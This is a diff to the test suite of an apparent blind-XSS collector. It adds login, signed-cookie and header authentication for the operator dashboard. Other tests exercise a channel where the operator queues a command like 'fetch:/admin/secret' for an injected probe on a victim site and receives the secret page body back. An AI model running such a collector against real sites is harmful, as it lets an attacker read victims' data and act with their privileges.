@@ -6,6 +6,7 @@ const HOST = 'https://c.example.net';
 let pass = 0, fail = 0;
 function ok(name, cond, extra) { if (cond) { pass++; console.log('  PASS', name); } else { fail++; console.log('  FAIL', name, extra != null ? '-> ' + JSON.stringify(extra) : ''); } }
 const req = (path, opts = {}) => worker.fetch(new Request(HOST + path, opts), env);
+const areq = (path, opts = {}) => req(path, { ...opts, headers: { ...(opts.headers || {}), 'X-Auth-Key': 'testkey' } });
 
 const env = makeEnv();
 
@@ -38,26 +39,38 @@ const env = makeEnv();
   ok('session upserted', sess.length === 1 && sess[0].url === 'https://victim.app/admin/logs');
 }
 
-// 3. dashboard auth gate
+// 3. auth: login page, no-URL-key gate, login flow (cookie), header auth
 {
-  ok('dashboard denies no key', (await req('/')).status === 401);
-  ok('dashboard denies bad key', (await req('/?key=wrong')).status === 401);
-  const good = await req('/?key=testkey');
-  ok('dashboard allows good key', good.status === 200 && (await good.text()).includes('blind-xss-collector'));
-  ok('api denies no key', (await req('/api/sessions')).status === 401);
+  const anon = await req('/');
+  const anonBody = await anon.text();
+  ok('unauth "/" serves the login page (200, no dashboard)', anon.status === 200 && anonBody.includes('operator sign in') && !anonBody.includes('Payload Generator'));
+  ok('no credential is honored from the URL', (await req('/?key=testkey')).status === 200 && !(await (await req('/?key=testkey')).text()).includes('Payload Generator'));
+  ok('api denies without auth', (await req('/api/sessions')).status === 401);
+
+  ok('login rejects wrong password', (await req('/login', { method: 'POST', body: JSON.stringify({ password: 'nope' }) })).status === 401);
+  const login = await req('/login', { method: 'POST', body: JSON.stringify({ password: 'testkey' }) });
+  const sc = login.headers.get('Set-Cookie') || '';
+  ok('login sets a signed HttpOnly session cookie', login.status === 200 && /bx_session=\d+\./.test(sc) && /HttpOnly/i.test(sc) && /SameSite=Strict/i.test(sc));
+
+  const bx = (sc.match(/bx_session=([^;]+)/) || [])[1];
+  const viaCookie = await req('/', { headers: { Cookie: 'bx_session=' + bx } });
+  ok('session cookie grants the dashboard', viaCookie.status === 200 && (await viaCookie.text()).includes('blind-xss-collector'));
+  ok('forged/expired cookie is rejected', (await req('/', { headers: { Cookie: 'bx_session=9999999999999.deadbeef' } })).status === 200
+    && !(await (await req('/', { headers: { Cookie: 'bx_session=9999999999999.deadbeef' } })).text()).includes('Payload Generator'));
+  ok('X-Auth-Key header grants api (CLI path)', (await areq('/api/sessions')).status === 200);
 }
 
 // 4. dashboard sees the session + report
 {
-  const ss = await (await req('/api/sessions?key=testkey')).json();
+  const ss = await (await areq('/api/sessions')).json();
   ok('api/sessions lists session', ss.length === 1 && ss[0].sid === 's1');
-  const reps = await (await req('/api/reports?key=testkey&sid=s1')).json();
+  const reps = await (await areq('/api/reports?sid=s1')).json();
   ok('api/reports returns report', reps.length === 1 && reps[0].title === 'Log Viewer');
 }
 
 // 5. interactive command lifecycle: queue -> poll -> result
 {
-  const q = await req('/api/cmd?key=testkey', { method: 'POST', body: JSON.stringify({ sid: 's1', cmd: 'fetch:/admin/secret' }) });
+  const q = await areq('/api/cmd', { method: 'POST', body: JSON.stringify({ sid: 's1', cmd: 'fetch:/admin/secret' }) });
   ok('command queued', (await q.json()).ok === true);
   const polled = await (await req('/q/s1')).json();
   ok('probe polls the pending command', polled.length === 1 && polled[0].cmd === 'fetch:/admin/secret');
@@ -65,7 +78,7 @@ const env = makeEnv();
   const polled2 = await (await req('/q/s1')).json();
   ok('polled command flips to sent (not re-served)', polled2.length === 0);
   await req('/qr/' + cmdId, { method: 'POST', body: JSON.stringify({ id: cmdId, result: 'SECRET-BODY-AS-VICTIM' }) });
-  const res = await (await req('/api/cmdresults?key=testkey&sid=s1')).json();
+  const res = await (await areq('/api/cmdresults?sid=s1')).json();
   ok('command result recorded', res[0].status === 'done' && res[0].result === 'SECRET-BODY-AS-VICTIM');
 }
 
